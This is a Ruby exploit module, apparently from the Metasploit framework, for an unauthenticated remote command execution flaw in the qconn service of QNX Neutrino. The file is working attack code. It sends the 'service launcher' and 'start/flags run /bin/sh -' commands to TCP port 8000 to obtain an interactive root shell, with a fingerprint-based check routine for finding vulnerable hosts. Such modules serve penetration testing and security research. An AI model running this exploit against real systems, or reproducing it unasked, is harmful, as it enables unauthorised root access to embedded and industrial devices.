##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "QNX QCONN Remote Command Execution Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in the qconn component of
        QNX Neutrino which can be abused to allow unauthenticated users to
        execute arbitrary commands under the context of the 'root' user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'David Odell', # Discovery
          'Mor!p3r <moriper[at]gmail.com>', # PoC
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '86672'],
          ['EDB',   '21520'],
          ['URL',   'http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos'],
          ['URL',   'http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html']
        ],
      'Payload'        =>
        {
          'BadChars'    => '',
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd_interact',
              'ConnectionType' => 'find',
            },
        },
      'DefaultOptions'  =>
        {
          'WfsDelay' => 10,
          'PAYLOAD'  => 'cmd/unix/interact',
        },
      'Platform'       => 'unix',    # QNX Neutrino
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          # Tested on QNX Neutrino 6.5 SP1
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Sep 4 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(8000)
      ], self.class)
  end

  def check

    @peer = "#{rhost}:#{rport}"

    # send check
    fingerprint = Rex::Text.rand_text_alphanumeric(rand(8)+4)
    vprint_status("#{@peer} - Sending check")
    connect
    req  = "service launcher\n"
    req << "start/flags run /bin/echo /bin/echo #{fingerprint}\n"
    sock.put(req)
    res  = sock.get_once(-1, 10)
    disconnect

    # check response
    if    res and res =~ /#{fingerprint}/
      return Exploit::CheckCode::Vulnerable
    elsif res and res =~ /QCONN/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end

  end

  def exploit

    @peer = "#{rhost}:#{rport}"

    # send payload
    req  = "service launcher\n"
    req << "start/flags run /bin/sh -\n"
    print_status("#{@peer} - Sending payload (#{req.length} bytes)")
    connect
    sock.put(req)
    res  = sock.get_once(-1, 10)

    # check response
    if res and res =~ /No controlling tty/
      print_good("#{@peer} - Payload sent successfully")
    else
      print_error("#{@peer} - Sending payload failed")
    end
    handler
    disconnect

  end
end
